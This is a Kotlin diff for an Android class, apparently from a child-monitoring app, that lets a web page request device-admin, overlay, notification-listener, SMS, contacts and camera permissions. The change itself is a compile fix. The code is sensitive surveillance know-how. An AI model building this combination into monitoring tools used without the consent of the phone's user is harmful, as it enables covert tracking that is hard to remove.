@@ -8,6 +8,7 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
+import android.os.Parcelable
 import android.provider.Settings
 import android.webkit.JavascriptInterface
 import androidx.core.app.ActivityCompat
@@ -54,18 +55,17 @@ class ChildWebInterface(private val mContext: Context) {
             "overlay" -> mContext.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${mContext.packageName}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
             "notification" -> mContext.startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
             "admin" -> {
-                // طلب صلاحية Device Admin
                 val devicePolicyManager = mContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                 val compName = ComponentName(mContext, MyDeviceAdminReceiver::class.java)
-                 if (!devicePolicyManager.isAdminActive(compName)) {
+                if (!devicePolicyManager.isAdminActive(compName)) {
                     val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
+                    // الإصلاح هنا: إضافة as Parcelable
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName as Parcelable)
                     intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق")
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     mContext.startActivity(intent)
-                 }
+                }
             }
-            // الأذونات التي تطلب وقت التشغيل (Runtime)
             "contacts" -> requestRuntimePermission(Manifest.permission.READ_CONTACTS)
             "sms" -> requestRuntimePermission(Manifest.permission.READ_SMS)
             "camera" -> requestRuntimePermission(Manifest.permission.CAMERA)
